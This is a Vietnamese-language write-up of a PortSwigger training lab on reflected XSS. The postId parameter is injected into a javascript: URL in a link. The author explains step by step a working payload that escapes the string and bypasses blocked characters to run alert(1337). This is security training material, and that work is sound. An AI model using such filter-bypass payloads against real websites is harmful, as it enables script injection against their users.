# Write-up: Reflected XSS in a JavaScript URL with some characters blocked

### Tổng quan
Khai thác lỗ hổng Reflected Cross-Site Scripting (XSS) trong chức năng hiển thị bài viết của ứng dụng, nơi tham số `postId` được chèn trực tiếp vào URL `javascript:` trong thẻ `<a>` mà không được làm sạch đúng cách. Một số ký tự bị chặn, nhưng payload `'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'` được sử dụng để thoát chuỗi và thực thi `alert(1337)` khi người dùng nhấp vào liên kết, vượt qua các hạn chế ký tự, hoàn thành lab.

### Mục tiêu
- Khai thác lỗ hổng Reflected XSS bằng cách chèn mã JavaScript vào URL `javascript:` trong tham số `postId`, sử dụng payload phức tạp để vượt qua các hạn chế ký tự, thực thi `alert(1337)` và hoàn thành lab.

### Công cụ sử dụng
- Burp Suite Community
- Firefox Browser

### Quy trình khai thác
1. **Thu thập thông tin (Reconnaissance)**
- Truy cập một bài viết bất kỳ (giả định: /post?postId=4) và sử dụng Burp Proxy để kiểm tra response:
- **Phản hồi**: Thấy đoạn HTML:
    ```html
    <a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d4%26'}).finally(_ => window.location = '/')">
    ```

- **Quan sát**:
    - Tham số `postId` được chèn trực tiếp vào tham số body của hàm `fetch()` trong URL `javascript:` của thẻ `<a>`.
    - Cấu trúc `'/post%3fpostId%3d4%26'` cho thấy `postId=4&` được URL-encoded và nằm trong chuỗi JavaScript.
    - Khi nhấp vào liên kết `<a>`, mã JavaScript trong `href` được thực thi.
    - Một số ký tự bị chặn, gợi ý cần payload phức tạp để thoát chuỗi và chèn mã JavaScript.

2. **Khai thác (Exploitation)**
- Chèn payload XSS vào tham số `postId`:
    `'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'`
- **Phản hồi**: Đoạn HTML trở thành:
    ```html
    <a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d%27%7D%2Cx%3Dx%3D%3E%7Bthrow%2F**%2Fonerror%3Dalert%2C1337%7D%2CtoString%3Dx%2Cwindow%2B%27%27%2C%7Bx%3A%27%26'}).finally(_ => window.location = '/')">
    ```
- Cơ chế chi tiết của payload `'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'`:
    - `'},`: Đóng đối tượng body trong `fetch()` để thoát khỏi chuỗi và bắt đầu đoạn mã JavaScript tùy ý.
    - `x=x=>{throw/**/onerror=alert,1337}`,: Định nghĩa biến `x` là một hàm mũi tên (`x=>`) gán giá trị `onerror=alert` và gọi `alert(1337)` khi có lỗi. Cú pháp `throw/**/onerror=alert,1337` sử dụng toán tử phẩy để gán `onerror=alert` và trả về `1337`. Dấu `/**/` là đại diện cho khoảng trắng để tránh lỗi cú pháp.
    - `toString=x`,: Gán biến `toString` bằng `x`, ép hàm `x` được gọi khi `toString()` được sử dụng.
    - `window+'',`: Ép window thành chuỗi, gọi `toString()` (là hàm `x`), kích hoạt `throw`, dẫn đến gọi `onerror` và thực thi `alert(1337)`.
    - `{x:':`: Tạo đối tượng mới để đảm bảo cú pháp hợp lệ và tránh lỗi khi chuỗi tiếp tục.

- **Kết quả**: Khi người dùng nhấp vào liên kết `<a`>, mã JavaScript trong `href` thực thi, kích hoạt `alert(1337)`, hiển thị hộp thoại và hoàn thành lab.
    ![solved](./images/1_solved.png)

### Bài học rút ra
- Hiểu cách khai thác lỗ hổng Reflected XSS bằng cách thoát chuỗi trong URL `javascript:` thông qua tham số `postId`, sử dụng cấu trúc JavaScript phức tạp để vượt qua các ký tự bị chặn và thực thi mã.
- Nhận thức tầm quan trọng của việc làm sạch (sanitizing) và mã hóa đúng cách input người dùng trước khi chèn vào các URL `javascript:` để ngăn chặn các cuộc tấn công XSS.

### Tài liệu tham khảo
- PortSwigger: Cross-Site Scripting (XSS)

### Kết luận
Lab này cung cấp kinh nghiệm thực tiễn trong việc phát hiện và khai thác lỗ hổng Reflected XSS trong URL `javascript:`, nhấn mạnh tầm quan trọng của việc làm sạch input người dùng và kiểm tra các ký tự bị chặn trong mã JavaScript. Xem portfolio đầy đủ tại https://github.com/Furu2805/Lab_PortSwigger.

*Viết bởi Toàn Lương, Tháng 7/2025.*